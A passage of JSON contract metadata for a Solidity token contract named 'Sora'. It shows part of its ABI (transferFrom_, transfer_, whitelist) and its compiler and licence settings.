":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountOrId\",\"type\":\"uint256\"}],\"name\":\"transferFrom_\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer_\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"whitelist\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "Sora", "CompilerVersion": "v0.7.6+commit.7338295f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://4517f37c99adea3321a666f9edb0833c9f5fc19559c5f632fad55a35dd284998"}